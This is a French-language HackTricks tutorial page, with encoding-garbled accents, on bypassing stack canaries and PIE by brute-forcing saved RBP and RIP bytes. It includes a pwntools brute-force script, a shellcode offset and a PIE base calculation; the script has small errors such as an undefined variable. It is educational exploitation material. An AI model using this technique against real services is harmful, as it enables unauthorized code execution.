# Adresses BF dans la pile

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en √©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>

**Si vous √™tes confront√© √† un binaire prot√©g√© par un canari et PIE (Position Independent Executable), vous devez probablement trouver un moyen de les contourner.**

![](<../../../.gitbook/assets/image (865).png>)

{% hint style="info" %}
Notez que **`checksec`** pourrait ne pas trouver qu'un binaire est prot√©g√© par un canari s'il a √©t√© compil√© statiquement et n'est pas capable d'identifier la fonction.\
Cependant, vous pouvez le remarquer manuellement si vous constatez qu'une valeur est enregistr√©e dans la pile au d√©but d'un appel de fonction et que cette valeur est v√©rifi√©e avant la sortie.
{% endhint %}

## Adresses BF

Pour **contourner le PIE**, vous devez **fuir une adresse**. Et si le binaire ne fuit pas d'adresses, le mieux √† faire est de **forcer le RBP et le RIP enregistr√©s dans la pile** dans la fonction vuln√©rable.\
Par exemple, si un binaire est prot√©g√© √† la fois par un **canari** et **PIE**, vous pouvez commencer √† forcer le canari, puis les **8 octets suivants** (x64) seront le **RBP** enregistr√© et les **8 octets suivants** seront le **RIP** enregistr√©.

{% hint style="success" %}
On suppose que l'adresse de retour dans la pile appartient au code binaire principal, ce qui, si la vuln√©rabilit√© est situ√©e dans le code binaire, sera g√©n√©ralement le cas.
{% endhint %}

Pour forcer le RBP et le RIP du binaire, vous pouvez d√©duire qu'un octet devin√© valide est correct si le programme affiche quelque chose ou s'il ne plante tout simplement pas. La **m√™me fonction** que celle fournie pour forcer le canari peut √™tre utilis√©e pour forcer le RBP et le RIP :
```python
from pwn import *

def connect():
r = remote("localhost", 8788)

def get_bf(base):
canary = ""
guess = 0x0
base += canary

while len(canary) < 8:
while guess != 0xff:
r = connect()

r.recvuntil("Username: ")
r.send(base + chr(guess))

if "SOME OUTPUT" in r.clean():
print "Guessed correct byte:", format(guess, '02x')
canary += chr(guess)
base += chr(guess)
guess = 0x0
r.close()
break
else:
guess += 1
r.close()

print "FOUND:\\x" + '\\x'.join("{:02x}".format(ord(c)) for c in canary)
return base

# CANARY BF HERE
canary_offset = 1176
base = "A" * canary_offset
print("Brute-Forcing canary")
base_canary = get_bf(base) #Get yunk data + canary
CANARY = u64(base_can[len(base_canary)-8:]) #Get the canary

# PIE BF FROM HERE
print("Brute-Forcing RBP")
base_canary_rbp = get_bf(base_canary)
RBP = u64(base_canary_rbp[len(base_canary_rbp)-8:])
print("Brute-Forcing RIP")
base_canary_rbp_rip = get_bf(base_canary_rbp)
RIP = u64(base_canary_rbp_rip[len(base_canary_rbp_rip)-8:])
```
La derni√®re chose dont vous avez besoin pour contourner le PIE est de calculer **des adresses utiles √† partir des adresses divulgu√©es** : le **RBP** et le **RIP**.

√Ä partir du **RBP**, vous pouvez calculer **o√π vous √©crivez votre shell dans la pile**. Cela peut √™tre tr√®s utile pour savoir o√π vous allez √©crire la cha√Æne _"/bin/sh\x00"_ √† l'int√©rieur de la pile. Pour calculer la distance entre le RBP divulgu√© et votre shellcode, il suffit de placer un **point d'arr√™t apr√®s la divulgation du RBP** et de v√©rifier **o√π se trouve votre shellcode**, puis vous pouvez calculer la distance entre le shellcode et le RBP :
```python
INI_SHELLCODE = RBP - 1152
```
√Ä partir du **RIP**, vous pouvez calculer l'**adresse de base du binaire PIE** dont vous aurez besoin pour cr√©er une **cha√Æne ROP valide**.\
Pour calculer l'adresse de base, ex√©cutez simplement `objdump -d vunbinary` et v√©rifiez les derni√®res adresses d√©sassembl√©es :

![](<../../../.gitbook/assets/image (479).png>)

Dans cet exemple, vous pouvez voir qu'il ne faut que **1 octet et demi** pour localiser tout le code, donc, l'adresse de base dans cette situation sera le **RIP divulgu√© mais se terminant par "000"**. Par exemple, si vous avez divulgu√© `0x562002970ecf`, l'adresse de base sera `0x562002970000`.
```python
elf.address = RIP - (RIP & 0xfff)
```
## Am√©liorations

Selon [**certaines observations de cet article**](https://github.com/florianhofhammer/stack-buffer-overflow-internship/blob/master/NOTES.md#extended-brute-force-leaking), il est possible que lors de la fuite des valeurs RBP et RIP, le serveur ne plante pas avec certaines valeurs qui ne sont pas les bonnes et le script BF pensera qu'il a obtenu les bonnes. Cela est d√ª au fait qu'il est possible que **certaines adresses ne le cassent pas m√™me si elles ne sont pas exactement les bonnes**.

Selon cet article de blog, il est recommand√© d'ajouter un court d√©lai entre les requ√™tes envoy√©es au serveur.
